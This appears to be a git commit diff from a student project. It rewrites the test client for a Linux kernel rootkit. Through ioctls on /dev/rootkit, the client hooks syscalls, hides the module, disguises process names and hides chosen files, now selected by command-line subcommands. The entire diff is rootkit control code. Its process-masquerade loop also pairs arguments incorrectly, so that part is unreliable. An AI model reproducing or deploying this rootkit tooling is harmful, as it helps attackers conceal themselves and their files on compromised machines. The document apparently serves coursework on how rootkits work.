7e7294ff3abd136621c71477d113b219841d4b9f
r12922015 <r12922015@ws4.csie.ntu.edu.tw>
2024-03-26 08:28:57 +0800

    add new test code (WIP: testing)

--- test.c
+++ test.c
@@ -7,9 +7,14 @@
 #include <errno.h>
 #include "rootkit.h"
 
-int main(void) {
+int main(int argc, char *argv[]) {
 
 	int fd;
+
+	if (argc <= 1) {
+		fprintf(stderr, "no command given\n");
+		exit(-1);
+	}
 
 	fd = open("/dev/rootkit", O_RDWR);
 	if (fd < 0) {
@@ -17,39 +22,75 @@ int main(void) {
 		exit(-1);
 	}
 
-	if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
-		fprintf(stderr, "ioctl failed\n");
-		exit(-1);
-	}
+	if (strcmp(argv[1], "hook") == 0) {
 
-	struct masq_proc masq[] = {
-		{ "hello", 		"sleep" },
-		{ "longlong", 	"sleep" },
-		{ "aa", 	"sleep" },
-		{ "longlonglong", 	"sleep" },
-	};
-	struct masq_proc_req req = {
-		.len = sizeof(masq) / sizeof(struct masq_proc),
-		.list = masq,
-	};
-	if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0) {
-		fprintf(stderr, "ioctl masq failed\n");
-		exit(-1);
-	}
+		if (ioctl(fd, IOCTL_MOD_HOOK) < 0) {
+			fprintf(stderr, "hook failed: %s\n", strerror(errno));
+			exit(-1);
+		}
 
-	if (ioctl(fd, IOCTL_MOD_HOOK) < 0) {
-		fprintf(stderr, "ioctl hook failed\n");
-		exit(-1);
-	}
+	} else if (strcmp(argv[1], "masq") == 0) {
 
-	struct hided_file hide = {
-		.len = 6,
-		.name = "test.c",
-	};
+		int n;
+		int i;
+		struct masq_proc *masq;
+		struct masq_proc_req req;
 
-	if (ioctl(fd, IOCTL_FILE_HIDE, &hide) < 0) {
-		fprintf(stderr, "ioctl file hide failed\n");
+		if (argc <= 2) {
+			fprintf(stderr, "no request provided\n");
+			exit(-1);
+		}
+
+		if (argc % 2 != 0) {
+			fprintf(stderr, "request format error\n");
+			exit(-1);
+		}
+		n = (argc - 2) / 2;
+
+		masq = (struct masq_proc *)malloc(sizeof(struct masq_proc) * n);
+		for (i = 0; i < n; i++) {
+			strncpy(masq[i].new_name, argv[2 + i], MASQ_LEN);
+			strncpy(masq[i].orig_name, argv[2 + i + 1], MASQ_LEN);
+		}
+
+		req.len = n;
+		req.list = masq;
+
+		if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0) {
+			fprintf(stderr, "masq failed: %s\n", strerror(errno));
+			exit(-1);
+		}
+
+	} else if (strcmp(argv[1], "hide-mod") == 0) {
+
+
+		if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
+			fprintf(stderr, "hide-mod failed: %s\n", strerror(errno));
+			exit(-1);
+		}
+
+	} else if (strcmp(argv[1], "hide-file") == 0) {
+
+		struct hided_file hide;
+
+		if (argc != 3) {
+			fprintf(stderr, "request format error\n");
+			exit(-1);
+		}
+
+		strncpy(hide.name, argv[2], NAME_LEN);
+		hide.len = strlen(hide.name);
+
+		if (ioctl(fd, IOCTL_FILE_HIDE, &hide) < 0) {
+			fprintf(stderr, "hide-file failed: %s\n", strerror(errno));
+			exit(-1);
+		}
+
+	} else {
+
+		fprintf(stderr, "unknown command\n");
 		exit(-1);
+
 	}
 
 	return 0;
